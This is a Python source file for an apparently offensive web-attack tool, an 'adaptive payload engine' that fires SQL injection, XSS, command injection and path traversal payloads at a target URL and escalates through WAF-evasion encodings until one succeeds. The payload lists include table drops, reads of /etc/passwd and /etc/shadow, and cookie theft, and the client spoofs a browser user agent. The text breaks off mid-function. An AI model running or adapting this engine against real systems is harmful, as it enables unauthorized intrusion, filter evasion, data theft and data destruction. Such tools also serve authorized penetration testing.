"""
Adaptive Payload Engine

Generates, mutates, and tests payloads across vulnerability types (SQLi, XSS,
Command Injection, Path Traversal).  When a basic payload is blocked by a WAF
or filter the engine automatically walks through bypass techniques until one
succeeds or all are exhausted.
"""

from __future__ import annotations

import enum
import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Optional

import httpx

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


class VulnType(str, enum.Enum):
    SQLI = "sqli"
    XSS = "xss"
    CMDI = "cmdi"
    PATH_TRAVERSAL = "path_traversal"


class Technique(str, enum.Enum):
    BASIC = "basic"
    CASE_VARIATION = "case_variation"
    COMMENT_INJECTION = "comment_injection"
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    HEX_ENCODE = "hex_encode"
    WHITESPACE_ALT = "whitespace_alt"
    ALT_KEYWORDS = "alt_keywords"
    TIME_BASED_BLIND = "time_based_blind"
    STRING_CONCAT = "string_concat"
    EVENT_HANDLERS = "event_handlers"
    NO_SCRIPT_TAGS = "no_script_tags"
    HTML_ENTITY_ENCODE = "html_entity_encode"
    UNICODE_ESCAPE = "unicode_escape"
    TEMPLATE_INJECTION = "template_injection"
    DOM_BASED = "dom_based"
    FILTER_BYPASS = "filter_bypass"
    NO_PARENS = "no_parens"
    ALT_FUNCTIONS = "alt_functions"
    JSFUCK_STYLE = "jsfuck_style"
    NEWLINE_SEP = "newline_sep"
    BACKTICK_SUB = "backtick_sub"
    DOLLAR_SUB = "dollar_sub"
    WILDCARD_BYPASS = "wildcard_bypass"
    QUOTE_BYPASS = "quote_bypass"
    VARIABLE_BYPASS = "variable_bypass"
    NO_SPACES = "no_spaces"
    DOUBLE_ENCODE_PATH = "double_encode_path"
    UNICODE_PATH = "unicode_path"
    NULL_BYTE = "null_byte"
    OVERLONG_UTF8 = "overlong_utf8"
    FILTER_BYPASS_PATH = "filter_bypass_path"
    ABSOLUTE_PATH = "absolute_path"
    WRAPPER_BYPASS = "wrapper_bypass"


@dataclass
class Payload:
    """A single payload string together with metadata."""

    raw: str
    vuln_type: VulnType
    technique: Technique
    description: str = ""


@dataclass
class PayloadResult:
    """Outcome of testing one payload against a target."""

    payload: str
    technique_used: Technique
    response_code: int
    blocked: bool
    success: bool
    evidence: str = ""
    response_time: float = 0.0
    response_size: int = 0


@dataclass
class AdaptiveResult:
    """Aggregate result of an adaptive test run."""

    working_payload: Optional[Payload] = None
    technique_used: Optional[Technique] = None
    all_results: list[PayloadResult] = field(default_factory=list)
    baseline_code: int = 0
    baseline_size: int = 0


# ---------------------------------------------------------------------------
# WAF / block detection helpers
# ---------------------------------------------------------------------------

_WAF_SIGNATURES = [
    "access denied",
    "blocked",
    "forbidden",
    "not acceptable",
    "request rejected",
    "web application firewall",
    "mod_security",
    "cloudflare",
    "incapsula",
    "akamai",
    "sucuri",
    "wordfence",
    "imperva",
]

_WAF_STATUS_CODES = {403, 406, 429, 501, 503}


def _looks_blocked(
    response: httpx.Response,
    baseline_code: int,
    baseline_size: int,
) -> bool:
    """Heuristically decide if *response* indicates the payload was blocked."""
    if response.status_code in _WAF_STATUS_CODES:
        return True

    body = response.text.lower()
    for sig in _WAF_SIGNATURES:
        if sig in body:
            return True

    # Dramatic size change vs. baseline can indicate a block page.
    if baseline_size > 0:
        ratio = len(response.text) / baseline_size
        if ratio < 0.3 or ratio > 3.0:
            return True

    # Empty body when baseline was non-empty.
    if baseline_size > 100 and len(response.text) == 0:
        return True

    return False


def _looks_successful(
    response: httpx.Response,
    vuln_type: VulnType,
    payload_raw: str,
) -> tuple[bool, str]:
    """Return (success, evidence) for a given response + vuln type."""
    body = response.text
    lower_body = body.lower()

    if vuln_type == VulnType.SQLI:
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "pg_query",
            "sqlite3.operationalerror",
            "microsoft ole db provider for sql server",
            "ora-01756",
            "sqlstate[",
        ]
        for err in sql_errors:
            if err in lower_body:
                return True, f"SQL error detected: {err}"
        # Time-based: if payload contains SLEEP and response > 2.5s that is
        # handled externally via response_time.
        return False, ""

    if vuln_type == VulnType.XSS:
        # Check if our payload string appears reflected unescaped.
        if payload_raw in body:
            return True, "Payload reflected unescaped in response body"
        # Common XSS evidence patterns.
        xss_patterns = [
            r"<script[^>]*>.*?alert\(",
            r"onerror\s*=",
            r"onload\s*=",
            r"javascript:",
        ]
        for pat in xss_patterns:
            if re.search(pat, body, re.IGNORECASE | re.DOTALL):
                return True, f"XSS pattern matched: {pat}"
        return False, ""

    if vuln_type == VulnType.CMDI:
        cmdi_evidence = [
            "root:x:0:0",  # /etc/passwd
            "uid=",  # id command
            "total ",  # ls output
            "directory of",  # Windows dir
        ]
        for ev in cmdi_evidence:
            if ev in lower_body:
                return True, f"Command output detected: {ev}"
        return False, ""

    if vuln_type == VulnType.PATH_TRAVERSAL:
        traversal_evidence = [
            "root:x:0:0",
            "[boot loader]",  # win.ini
            "[extensions]",
            "<?php",
        ]
        for ev in traversal_evidence:
            if ev in lower_body:
                return True, f"File content detected: {ev}"
        return False, ""

    return False, ""


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------


def _url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def _double_url_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _hex_encode_sql(s: str) -> str:
    return "0x" + s.encode().hex()


def _html_entity_encode(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def _unicode_escape_js(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)


def _randomise_case(s: str) -> str:
    """Alternate upper/lower case for alphabetical characters."""
    out: list[str] = []
    toggle = False
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if toggle else ch.lower())
            toggle = not toggle
        else:
            out.append(ch)
    return "".join(out)


# ---------------------------------------------------------------------------
# Payload generators per vuln type
# ---------------------------------------------------------------------------


def _sqli_payloads() -> dict[Technique, list[Payload]]:
    vt = VulnType.SQLI

    basic = [
        Payload("1'", vt, Technique.BASIC, "Single quote test"),
        Payload("1' OR '1'='1", vt, Technique.BASIC, "Classic OR tautology"),
        Payload("1' UNION SELECT NULL--", vt, Technique.BASIC, "UNION SELECT probe"),
        Payload("1' OR 1=1--", vt, Technique.BASIC, "Numeric OR tautology"),
        Payload("1'; DROP TABLE test--", vt, Technique.BASIC, "Statement termination"),
    ]

    case_var = [
        Payload("1' oR '1'='1", vt, Technique.CASE_VARIATION, "Mixed case OR"),
        Payload("1' UnIoN SeLeCt NULL--", vt, Technique.CASE_VARIATION, "Mixed case UNION SELECT"),
        Payload("1' oR 1=1--", vt, Technique.CASE_VARIATION, "Mixed case numeric OR"),
    ]

    comment = [
        Payload("1'/**/OR/**/1=1--", vt, Technique.COMMENT_INJECTION, "Inline comment spaces"),
        Payload("1' /*!UNION*/ /*!SELECT*/ NULL--", vt, Technique.COMMENT_INJECTION, "MySQL conditional comments"),
        Payload("1'/**/oR/**/1=1--", vt, Technique.COMMENT_INJECTION, "Comment + case variation"),
    ]

    url_enc = [
        Payload(_url_encode("1' OR '1'='1"), vt, Technique.URL_ENCODE, "URL-encoded OR tautology"),
        Payload(_url_encode("1' UNION SELECT NULL--"), vt, Technique.URL_ENCODE, "URL-encoded UNION SELECT"),
    ]

    dbl_enc = [
        Payload(_double_url_encode("1' OR '1'='1"), vt, Technique.DOUBLE_URL_ENCODE, "Double URL-encoded OR"),
        Payload(_double_url_encode("1' UNION SELECT NULL--"), vt, Technique.DOUBLE_URL_ENCODE, "Double URL-encoded UNION"),
    ]

    hex_enc = [
        Payload("1' OR " + _hex_encode_sql("1") + "=" + _hex_encode_sql("1") + "--", vt, Technique.HEX_ENCODE, "Hex-encoded comparison"),
    ]

    ws_alt = [
        Payload("1'\tOR\t1=1--", vt, Technique.WHITESPACE_ALT, "Tab whitespace"),
        Payload("1'\nOR\n1=1--", vt, Technique.WHITESPACE_ALT, "Newline whitespace"),
        Payload("1'/**/OR/**/1=1--", vt, Technique.WHITESPACE_ALT, "Comment as whitespace"),
    ]

    alt_kw = [
        Payload("1' || '1'='1", vt, Technique.ALT_KEYWORDS, "|| instead of OR"),
        Payload("1' && '1'='1", vt, Technique.ALT_KEYWORDS, "&& instead of AND"),
        Payload("1' DIV 0--", vt, Technique.ALT_KEYWORDS, "DIV for error-based"),
    ]

    time_blind = [
        Payload("1' AND SLEEP(3)--", vt, Technique.TIME_BASED_BLIND, "MySQL SLEEP"),
        Payload("1' AND BENCHMARK(10000000,SHA1('test'))--", vt, Technique.TIME_BASED_BLIND, "MySQL BENCHMARK"),
        Payload("1'; WAITFOR DELAY '0:0:3'--", vt, Technique.TIME_BASED_BLIND, "MSSQL WAITFOR"),
        Payload("1' AND pg_sleep(3)--", vt, Technique.TIME_BASED_BLIND, "PostgreSQL pg_sleep"),
    ]

    str_concat = [
        Payload("1' OR CONCAT('1','1')='11'--", vt, Technique.STRING_CONCAT, "CONCAT function"),
        Payload("1' OR '1'||'1'='11'--", vt, Technique.STRING_CONCAT, "|| concatenation"),
        Payload("1' OR CHR(49)||CHR(49)='11'--", vt, Technique.STRING_CONCAT, "CHR function concat"),
    ]

    return {
        Technique.BASIC: basic,
        Technique.CASE_VARIATION: case_var,
        Technique.COMMENT_INJECTION: comment,
        Technique.URL_ENCODE: url_enc,
        Technique.DOUBLE_URL_ENCODE: dbl_enc,
        Technique.HEX_ENCODE: hex_enc,
        Technique.WHITESPACE_ALT: ws_alt,
        Technique.ALT_KEYWORDS: alt_kw,
        Technique.TIME_BASED_BLIND: time_blind,
        Technique.STRING_CONCAT: str_concat,
    }


def _xss_payloads() -> dict[Technique, list[Payload]]:
    vt = VulnType.XSS

    basic = [
        Payload("<script>alert(1)</script>", vt, Technique.BASIC, "Basic script tag"),
        Payload("<script>alert(document.cookie)</script>", vt, Technique.BASIC, "Cookie exfil"),
        Payload('"><script>alert(1)</script>', vt, Technique.BASIC, "Attribute breakout"),
    ]

    event = [
        Payload("<img src=x onerror=alert(1)>", vt, Technique.EVENT_HANDLERS, "img onerror"),
        Payload("<svg onload=alert(1)>", vt, Technique.EVENT_HANDLERS, "svg onload"),
        Payload("<body onload=alert(1)>", vt, Technique.EVENT_HANDLERS, "body onload"),
        Payload('<marquee onstart=alert(1)>', vt, Technique.EVENT_HANDLERS, "marquee onstart"),
        Payload('<details open ontoggle=alert(1)>', vt, Technique.EVENT_HANDLERS, "details ontoggle"),
    ]

    no_script = [
        Payload("<img src=x onerror=alert(1)>", vt, Technique.NO_SCRIPT_TAGS, "img onerror no script"),
        Payload("<input onfocus=alert(1) autofocus>", vt, Technique.NO_SCRIPT_TAGS, "input autofocus"),
        Payload('<div style="width:expression(alert(1))">', vt, Technique.NO_SCRIPT_TAGS, "CSS expression (IE)"),
    ]

    case_var = [
        Payload("<ScRiPt>alert(1)</sCrIpT>", vt, Technique.CASE_VARIATION, "Mixed case script tag"),
        Payload("<IMG SRC=x OnErRoR=alert(1)>", vt, Technique.CASE_VARIATION, "Mixed case event handler"),
    ]

    html_ent = [
        Payload(_html_entity_encode("<script>alert(1)</script>"), vt, Technique.HTML_ENTITY_ENCODE, "HTML entity encoded"),
        Payload("&#60;script&#62;alert(1)&#60;/script&#62;", vt, Technique.HTML_ENTITY_ENCODE, "Numeric entities"),
    ]

    unicode_esc = [
        Payload(_unicode_escape_js("alert(1)"), vt, Technique.UNICODE_ESCAPE, "Unicode JS escape"),
        Payload("<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>", vt, Technique.UNICODE_ESCAPE, "Unicode alert"),
    ]

    template = [
        Payload("{{constructor.constructor('alert(1)')()}}", vt, Technique.TEMPLATE_INJECTION, "Angular template injection"),
        Payload("${alert(1)}", vt, Technique.TEMPLATE_INJECTION, "Template literal"),
        Payload("{{7*7}}", vt, Technique.TEMPLATE_INJECTION, "SSTI probe"),
    ]

    dom = [
        Payload("javascript:alert(1)", vt, Technique.DOM_BASED, "javascript: URI"),
        Payload("data:text/html,<script>alert(1)</script>", vt, Technique.DOM_BASED, "data: URI"),
        Payload("javascript:void(alert(1))", vt, Technique.DOM_BASED, "javascript:void"),
    ]

    filt_bypass = [
        Payload("<scr<script>ipt>alert(1)</scr</script>ipt>", vt, Technique.FILTER_BYPASS, "Nested tag bypass"),
        Payload("<scri%00pt>alert(1)</scri%00pt>", vt, Technique.FILTER_BYPASS, "Null byte in tag"),
        Payload(_double_url_encode("<script>alert(1)</script>"), vt, Technique.FILTER_BYPASS, "Double URL-encoded XSS"),
        Payload("<svg/onload=alert(1)>", vt, Technique.FILTER_BYPASS, "Slash instead of space"),
    ]

    no_parens = [
        Payload("<script>alert`1`</script>", vt, Technique.NO_PARENS, "Template literal call"),
        Payload("<img src=x onerror=alert`1`>", vt, Technique.NO_PARENS, "Backtick alert in handler"),
    ]

    alt_func = [
        Payload("<script>confirm(1)</script>", vt, Technique.ALT_FUNCTIONS, "confirm instead of alert"),
        Payload("<script>prompt(1)</script>", vt, Technique.ALT_FUNCTIONS, "prompt instead of alert"),
        Payload("<script>console.log(1)</script>", vt, Technique.ALT_FUNCTIONS, "console.log"),
        Payload("<script>window.onerror=eval;throw'=alert\\x281\\x29'</script>", vt, Technique.ALT_FUNCTIONS, "throw/eval trick"),
    ]

    jsfuck = [
        Payload("<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</script>", vt, Technique.JSFUCK_STYLE, "JSFuck-style encoding"),
    ]

    return {
        Technique.BASIC: basic,
        Technique.EVENT_HANDLERS: event,
        Technique.NO_SCRIPT_TAGS: no_script,
        Technique.CASE_VARIATION: case_var,
        Technique.HTML_ENTITY_ENCODE: html_ent,
        Technique.UNICODE_ESCAPE: unicode_esc,
        Technique.TEMPLATE_INJECTION: template,
        Technique.DOM_BASED: dom,
        Technique.FILTER_BYPASS: filt_bypass,
        Technique.NO_PARENS: no_parens,
        Technique.ALT_FUNCTIONS: alt_func,
        Technique.JSFUCK_STYLE: jsfuck,
    }


def _cmdi_payloads() -> dict[Technique, list[Payload]]:
    vt = VulnType.CMDI

    basic = [
        Payload("; id", vt, Technique.BASIC, "Semicolon separator"),
        Payload("| id", vt, Technique.BASIC, "Pipe separator"),
        Payload("& id", vt, Technique.BASIC, "Background separator"),
        Payload("&& id", vt, Technique.BASIC, "AND separator"),
        Payload("|| id", vt, Technique.BASIC, "OR separator"),
    ]

    newline = [
        Payload("%0aid", vt, Technique.NEWLINE_SEP, "LF separator"),
        Payload("%0did", vt, Technique.NEWLINE_SEP, "CR separator"),
        Payload("%0a%0did", vt, Technique.NEWLINE_SEP, "CRLF separator"),
    ]

    backtick = [
        Payload("`id`", vt, Technique.BACKTICK_SUB, "Backtick substitution"),
        Payload("; `cat /etc/passwd`", vt, Technique.BACKTICK_SUB, "Backtick cat passwd"),
    ]

    dollar = [
        Payload("$(id)", vt, Technique.DOLLAR_SUB, "$() substitution"),
        Payload("$(cat /etc/passwd)", vt, Technique.DOLLAR_SUB, "$() cat passwd"),
    ]

    url_enc = [
        Payload(_url_encode("; id"), vt, Technique.URL_ENCODE, "URL-encoded ; id"),
        Payload(_url_encode("| cat /etc/passwd"), vt, Technique.URL_ENCODE, "URL-encoded pipe cat"),
    ]

    hex_enc = [
        Payload("; \\x69\\x64", vt, Technique.HEX_ENCODE, "Hex-encoded id"),
        Payload("; \\x63\\x61\\x74 /etc/passwd", vt, Technique.HEX_ENCODE, "Hex-encoded cat"),
    ]

    wildcard = [
        Payload("; /b?n/cat /e?c/p?ss?d", vt, Technique.WILDCARD_BYPASS, "Wildcard path bypass"),
        Payload("; cat /etc/pas*", vt, Technique.WILDCARD_BYPASS, "Glob wildcard bypass"),
        Payload("; /???/??t /???/??????", vt, Technique.WILDCARD_BYPASS, "Full wildcard"),
    ]

    quote = [
        Payload('; c""at /etc/passwd', vt, Technique.QUOTE_BYPASS, "Double quote bypass"),
        Payload("; c''at /etc/passwd", vt, Technique.QUOTE_BYPASS, "Single quote bypass"),
        Payload('; ca$@t /etc/passwd', vt, Technique.QUOTE_BYPASS, "Dollar-at bypass"),
    ]

    variable = [
        Payload("; u=cat;$u /etc/passwd", vt, Technique.VARIABLE_BYPASS, "Variable assignment"),
        Payload("; a=c;b=at;$a$b /etc/passwd", vt, Technique.VARIABLE_BYPASS, "Split variable"),
    ]

    no_space = [
        Payload(";{cat,/etc/passwd}", vt, Technique.NO_SPACES, "Brace expansion"),
        Payload(";cat${IFS}/etc/passwd", vt, Technique.NO_SPACES, "IFS variable"),
        Payload(";cat</etc/passwd", vt, Technique.NO_SPACES, "Input redirect no space"),
    ]

    return {
        Technique.BASIC: basic,
        Technique.NEWLINE_SEP: newline,
        Technique.BACKTICK_SUB: backtick,
        Technique.DOLLAR_SUB: dollar,
        Technique.URL_ENCODE: url_enc,
        Technique.HEX_ENCODE: hex_enc,
        Technique.WILDCARD_BYPASS: wildcard,
        Technique.QUOTE_BYPASS: quote,
        Technique.VARIABLE_BYPASS: variable,
        Technique.NO_SPACES: no_space,
    }


def _path_traversal_payloads() -> dict[Technique, list[Payload]]:
    vt = VulnType.PATH_TRAVERSAL

    basic = [
        Payload("../../../etc/passwd", vt, Technique.BASIC, "Basic Unix traversal"),
        Payload("..\\..\\..\\windows\\win.ini", vt, Technique.BASIC, "Basic Windows traversal"),
        Payload("../../../etc/shadow", vt, Technique.BASIC, "Shadow file traversal"),
        Payload("../../../../etc/passwd", vt, Technique.BASIC, "Deep traversal"),
    ]

    dbl_enc = [
        Payload("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", vt, Technique.DOUBLE_ENCODE_PATH, "Double-encoded Unix traversal"),
        Payload("%252e%252e%255c%252e%252e%255cetc%255cpasswd", vt, Technique.DOUBLE_ENCODE_PATH, "Double-encoded backslash"),
    ]

    unicode = [
        Payload("..%c0%af..%c0%af..%c0%afetc/passwd", vt, Technique.UNICODE_PATH, "Unicode / encoding"),
        Payload("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", vt, Technique.UNICODE_PATH, "Fullwidth / encoding"),
        Payload("..%c1%9c..%c1%9c..%c1%9cetc/passwd", vt, Technique.UNICODE_PATH, "Overlong backslash"),
    ]

    null = [
        Payload("../../../etc/passwd%00.jpg", vt, Technique.NULL_BYTE, "Null byte + jpg extension"),
        Payload("../../../etc/passwd%00.png", vt, Technique.NULL_BYTE, "Null byte + png extension"),
        Payload("../../../etc/passwd%00.html", vt, Technique.NULL_BYTE, "Null byte + html extension"),
    ]

    overlong = [
        Payload("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", vt, Technique.OVERLONG_UTF8, "Overlong UTF-8 dot"),
        Payload("%c0%ae%c0%ae%c0%afetc%c0%afpasswd", vt, Technique.OVERLONG_UTF8, "Overlong UTF-8 dot+slash"),
    ]

    filt = [
        Payload("....//....//....//etc/passwd", vt, Technique.FILTER_BYPASS_PATH, "Double dot-slash bypass"),
        Payload("..;/..;/..;/etc/passwd", vt, Technique.FILTER_BYPASS_PATH, "Semicolon bypass (Tomcat)"),
        Payload("..%00/..%00/..%00/etc/passwd", vt, Technique.FILTER_BYPASS_PATH, "Null in traversal"),
        Payload("..\\..\\..\\..\\.../etc/passwd", vt, Technique.FILTER_BYPASS_PATH, "Mixed separator bypass"),
    ]

    absolute = [
        Payload("/etc/passwd", vt, Technique.ABSOLUTE_PATH, "Absolute Unix path"),
        Payload("C:\\windows\\win.ini", vt, Technique.ABSOLUTE_PATH, "Absolute Windows path"),
        Payload("/etc/hosts", vt, Technique.ABSOLUTE_PATH, "Hosts file"),
    ]

    wrapper = [
        Payload("php://filter/convert.base64-encode/resource=/etc/passwd", vt, Technique.WRAPPER_BYPASS, "PHP filter base64"),
        Payload("php://filter/read=string.rot13/resource=/etc/passwd", vt, Technique.WRAPPER_BYPASS, "PHP filter rot13"),
        Payload("file:///etc/passwd", vt, Technique.WRAPPER_BYPASS, "file:// wrapper"),
    ]

    return {
        Technique.BASIC: basic,
        Technique.DOUBLE_ENCODE_PATH: dbl_enc,
        Technique.UNICODE_PATH: unicode,
        Technique.NULL_BYTE: null,
        Technique.OVERLONG_UTF8: overlong,
        Technique.FILTER_BYPASS_PATH: filt,
        Technique.ABSOLUTE_PATH: absolute,
        Technique.WRAPPER_BYPASS: wrapper,
    }


# Map vuln type -> payload generator.
_PAYLOAD_REGISTRY: dict[VulnType, Any] = {
    VulnType.SQLI: _sqli_payloads,
    VulnType.XSS: _xss_payloads,
    VulnType.CMDI: _cmdi_payloads,
    VulnType.PATH_TRAVERSAL: _path_traversal_payloads,
}

# Technique ordering per vuln type (start cheap, escalate).
_TECHNIQUE_ORDER: dict[VulnType, list[Technique]] = {
    VulnType.SQLI: [
        Technique.BASIC,
        Technique.CASE_VARIATION,
        Technique.COMMENT_INJECTION,
        Technique.WHITESPACE_ALT,
        Technique.ALT_KEYWORDS,
        Technique.URL_ENCODE,
        Technique.DOUBLE_URL_ENCODE,
        Technique.HEX_ENCODE,
        Technique.STRING_CONCAT,
        Technique.TIME_BASED_BLIND,
    ],
    VulnType.XSS: [
        Technique.BASIC,
        Technique.EVENT_HANDLERS,
        Technique.NO_SCRIPT_TAGS,
        Technique.CASE_VARIATION,
        Technique.ALT_FUNCTIONS,
        Technique.NO_PARENS,
        Technique.FILTER_BYPASS,
        Technique.HTML_ENTITY_ENCODE,
        Technique.UNICODE_ESCAPE,
        Technique.TEMPLATE_INJECTION,
        Technique.DOM_BASED,
        Technique.JSFUCK_STYLE,
    ],
    VulnType.CMDI: [
        Technique.BASIC,
        Technique.NEWLINE_SEP,
        Technique.BACKTICK_SUB,
        Technique.DOLLAR_SUB,
        Technique.QUOTE_BYPASS,
        Technique.WILDCARD_BYPASS,
        Technique.VARIABLE_BYPASS,
        Technique.NO_SPACES,
        Technique.URL_ENCODE,
        Technique.HEX_ENCODE,
    ],
    VulnType.PATH_TRAVERSAL: [
        Technique.BASIC,
        Technique.DOUBLE_ENCODE_PATH,
        Technique.UNICODE_PATH,
        Technique.NULL_BYTE,
        Technique.OVERLONG_UTF8,
        Technique.FILTER_BYPASS_PATH,
        Technique.ABSOLUTE_PATH,
        Technique.WRAPPER_BYPASS,
    ],
}


# ---------------------------------------------------------------------------
# Mutation engine
# ---------------------------------------------------------------------------


def _mutate_payload(payload: Payload, technique: Technique) -> list[Payload]:
    """Apply a mutation *technique* to an existing *payload*, returning new variants."""
    raw = payload.raw
    vt = payload.vuln_type
    results: list[Payload] = []

    if technique == Technique.URL_ENCODE:
        results.append(Payload(_url_encode(raw), vt, technique, f"URL-encoded: {payload.description}"))
    elif technique == Technique.DOUBLE_URL_ENCODE:
        results.append(Payload(_double_url_encode(raw), vt, technique, f"Double URL-encoded: {payload.description}"))
    elif technique == Technique.CASE_VARIATION:
        results.append(Payload(_randomise_case(raw), vt, technique, f"Case-randomised: {payload.description}"))
    elif technique == Technique.HTML_ENTITY_ENCODE:
        results.append(Payload(_html_entity_encode(raw), vt, technique, f"HTML-entity encoded: {payload.description}"))
    elif technique == Technique.UNICODE_ESCAPE:
        results.append(Payload(_unicode_escape_js(raw), vt, technique, f"Unicode-escaped: {payload.description}"))
    elif technique == Technique.WHITESPACE_ALT:
        mutated = raw.replace(" ", "/**/")
        results.append(Payload(mutated, vt, technique, f"Comment-whitespace: {payload.description}"))
        mutated_tab = raw.replace(" ", "\t")
        results.append(Payload(mutated_tab, vt, technique, f"Tab-whitespace: {payload.description}"))
    elif technique == Technique.NULL_BYTE:
        results.append(Payload(raw + "%00", vt, technique, f"Null-byte appended: {payload.description}"))
    else:
        # For techniques without a generic mutation, return the payload unchanged.
        results.append(Payload(raw, vt, technique, f"Passthrough ({technique.value}): {payload.description}"))

    return results


# ---------------------------------------------------------------------------
# Main engine class
# ---------------------------------------------------------------------------


class PayloadEngine:
    """Generates, mutates, and adaptively tests payloads against a target."""

    def __init__(
        self,
        timeout: float = 10.0,
        max_retries: int = 2,
        delay_between_requests: float = 0.1,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        verify_ssl: bool = False,
    ) -> None:
        self.timeout = timeout
        self.max_retries = max_retries
        self.delay = delay_between_requests
        self.user_agent = user_agent
        self.verify_ssl = verify_ssl

        # Track which techniques have historically worked so we can prioritise.
        self._technique_hits: dict[Technique, int] = {}

    # -- public API --------------------------------------------------------

    def generate(
        self,
        vuln_type: VulnType,
        context: Optional[dict[str, Any]] = None,
    ) -> list[Payload]:
        """Return all payloads for *vuln_type*, optionally filtered by *context*.

        *context* may include:
            technique  – restrict to a single Technique
            max        – maximum number of payloads to return
        """
        context = context or {}
        gen_fn = _PAYLOAD_REGISTRY.get(vuln_type)
        if gen_fn is None:
            raise ValueError(f"Unsupported vulnerability type: {vuln_type}")

        payloads_by_technique: dict[Technique, list[Payload]] = gen_fn()
        technique_filter: Optional[Technique] = context.get("technique")

        payloads: list[Payload] = []
        order = _TECHNIQUE_ORDER.get(vuln_type, list(payloads_by_technique.keys()))
        for tech in order:
            if technique_filter and tech != technique_filter:
                continue
            payloads.extend(payloads_by_technique.get(tech, []))

        limit = context.get("max")
        if limit is not None:
            payloads = payloads[:limit]

        return payloads

    def mutate(
        self,
        payload: Payload,
        technique: Technique,
    ) -> list[Payload]:
        """Apply *technique* to *payload* and return mutated variants."""
        return _mutate_payload(payload, technique)

    async def test_and_adapt(
        self,
        url: str,
        param: str,
        vuln_type: VulnType,
        cookies: Optional[dict[str, str]] = None,
        extra_params: Optional[dict[str, str]] = None,
        method: str = "GET",
    ) -> AdaptiveResult:
        """Adaptively test payloads against *url*, escalating bypass techniques.

        1. Obtain a baseline response (no payload).
        2. Walk through technique tiers, testing each payload.
        3. On first confirmed success, return immediately.
        4. On block, escalate to the next technique tier.
        5. If all techniques exhausted, return the full result set.
        """
        result = AdaptiveResult()
        headers = {"User-Agent": self.user_agent}

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(self.timeout),
            verify=self.verify_ssl,
            follow_redirects=True,
        ) as client:
            # -- baseline request ------------------------------------------
            baseline_resp = await self._send_request(
                client,
                url=url,
                param=param,
                payload_value="1",
                method=method,
                cookies=cookies,
                extra_params=extra_params,
                headers=headers,
            )
            if baseline_resp is None:
                logger.error("Could not obtain baseline response for %s", url)
                return result

            result.baseline_code = baseline_resp.status_code
            result.baseline_size = len(baseline_resp.text)

            # -- ordered technique walk ------------------------------------
            technique_order = self._prioritised_techniques(vuln_type)
            gen_fn = _PAYLOAD_REGISTRY[vuln_type]
            payloads_by_technique: dict[Technique, list[Payload]] = gen_fn()

            for technique in technique_order:
                payloads = payloads_by_technique.get(technique, [])
                if not payloads:
                    continue

                technique_blocked = False
                for payload in payloads:
                    pr = await self._test_payload(
                        client,
                        url=url,
                        param=param,
                        payload=payload,
                        method=method,
                        cookies=cookies,
                        extra_params=extra_params,
                        headers=headers,
                        baseline_code=result.baseline_code,
                        baseline_size=result.baseline_size,
                    )
                    result.all_results.append(pr)

                    if pr.success:
                        self._record_hit(technique)
                        result.working_payload = payload
                        result.technique_used = technique
                        logger.info(
                            "Payload succeeded: technique=%s payload=%r evidence=%s",
                            technique.value,
                            payload.raw,
                            pr.evidence,
                        )
                        return result

                    if pr.blocked:
                        technique_blocked = True

                    if self.delay > 0:
                        time.sleep(self.delay)

                if technique_blocked:
                    logger.debug(
                        "Technique %s appears blocked, escalating.", technique.value
                    )

        logger.info(
            "All %d techniques exhausted without confirmed success for %s param=%s",
            len(technique_order),
            url,
            param,
        )
        return result

    # -- internals ---------------------------------------------------------

    def _prioritised_techniques(self, vuln_type: VulnType) -> list[Technique]:
        """Return technique order, boosting historically successful ones."""
        base_order = list(_TECHNIQUE_ORDER.get(vuln_type, []))
        if not self._technique_hits:
            return base_order

        def _sort_key(t: Technique) -> tuple[int, int]:
            hits = self._technique_hits.get(t, 0)
            try:
                idx = base_order.index(t)
            except ValueError:
                idx = len(base_order)
            # Higher hits first (negate), then original order.
            return (-hits, idx)

        return sorted(base_order, key=_sort_key)

    def _record_hit(self, technique: Technique) -> None:
        self._technique_hits[technique] = self._technique_hits.get(technique, 0) + 1

    async def _send_request(
        self,
        client: httpx.AsyncClient,
        *,
        url: str,
        param: str,
        payload_value: str,
        method: str,
        cookies: Optional[dict[str, str]],
        extra_params: Optional[dict[str, str]],
        headers: dict[str, str],
    ) -> Optional[httpx.Response]:
        """Fire a single HTTP request injecting *payload_value* into *param*."""
        params = dict(extra_params) if extra_params else {}
        params[param] = payload_value

        for attempt in range(1, self.max_retries + 1):
            try:
                if method.upper() == "GET":
                    resp = await client.get(
                        url, params=params, headers=headers, cookies=cookies
                    )
                else:
                    resp = await client.post(
                        url, data=params, headers=headers, cookies=cookies
                    )
                return resp
            except httpx.TimeoutException:
                logger.warning(
                    "Request timed out (attempt %d/%d): %s",
                    attempt,
                    self.max_retries,
                    url,
                )
            except httpx.HTTPError as exc:
                logger.warning(
                    "HTTP error (attempt %d/%d): %s – %s",
                    attempt,
                    self.max_retries,
                    url,
                    exc,
                )
        return None

    async def _test_payload(
        self,
        client: httpx.AsyncClient,
        *,
        url: str,
        param: str,
        payload: Payload,
        method: str,
        cookies: Optional[dict[str, str]],
        extra_params: Optional[dict[str, str]],
        headers: dict[str, str],
        baseline_code: int,
        baseline_size: int,
    ) -> PayloadResult:
        """Test a single payload and classify the result."""
        start = time.monotonic()
        resp = await self._send_request(
            client,
            url=url,
            param=param,
            payload_value=payload.raw,
            method=method,
